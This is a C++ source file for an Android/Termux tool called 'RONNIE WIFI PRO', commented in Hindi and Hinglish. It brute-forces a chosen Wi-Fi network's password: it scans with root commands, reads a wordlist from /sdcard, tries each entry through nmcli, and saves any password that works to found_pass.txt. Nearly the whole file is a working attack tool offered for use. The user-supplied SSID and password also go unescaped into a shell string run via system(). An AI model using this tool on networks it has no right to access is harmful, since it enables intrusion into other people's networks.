#include <iostream>
#include <iwlib.h>
#include <string>
#include <fstream>
#include <unistd.h>
#include <vector>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

int main() {
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "        RONNIE WIFI PRO (MOBILE/TERMUX)    " << endl;
    cout << "===========================================" << RESET << endl;

    string card;
    cout << "ENTER_INTERFACE (wlan0): ";
    getline(cin, card);

    // वाई-फाई स्कैनिंग (Root required on Android)
    cout << YELLOW << "[*] Scanning for Networks..." << RESET << endl;
    system("su -c 'cmd -w wifi list-scan-results' || nmcli dev wifi list");

    string target_ssid, wordlist_path;
    cout << CYAN << "\nTarget SSID: " << RESET; getline(cin >> ws, target_ssid);

    // --- मोबाइल स्टोरेज से फाइल चुनने का ऑप्शन ---
    cout << CYAN << "Wordlist selection mode:\n[1] Enter Path Manually\n[2] Pick from /sdcard/\nCHOOSE: " << RESET;
    int mode; cin >> mode;
    if(mode == 2) {
        system("ls /sdcard/*.txt"); // मोबाइल की मुख्य स्टोरेज की टेक्स्ट फाइलें दिखाएगा
        cout << "File ka naam likhein: ";
        string filename; cin >> filename;
        wordlist_path = "/sdcard/" + filename;
    } else {
        cout << "Full path likhein: "; cin >> wordlist_path;
    }

    ifstream file(wordlist_path);
    if (!file.is_open()) {
        cerr << RED << "Error: Wordlist file nahi mili!" << RESET << endl;
        return 1;
    }

    string current_password;
    bool success = false;
    int line_number = 0;

    while (getline(file, current_password)) {
        line_number++;
        if (current_password.length() < 8) continue;
        if (!current_password.empty() && current_password.back() == '\r') current_password.pop_back();

        cout << RED << "[" << line_number << "] TRYING: " << current_password << RESET << flush;

        // Android/Linux Network Manager command
        string command = "su -c 'svc wifi disable && svc wifi enable' && "; // Reset WiFi
        command += "nmcli dev wifi connect \"" + target_ssid + "\" password \"" + current_password + "\" > /dev/null 2>&1";
        
        int ret = system(command.c_str());

        if (ret == 0) {
            cout << GREEN << " -> [SUCCESS!]" << RESET << endl;
            ofstream saveFile("found_pass.txt", ios::app);
            saveFile << "SSID: " << target_ssid << " | Pass: " << current_password << endl;
            success = true;
            break; 
        } else {
            cout << RED << " -> [FAILED]" << RESET << endl;
        }
        usleep(500000); 
    }

    if (!success) cout << RED << "\n[-] Password not found." << RESET << endl;
    return 0;
}
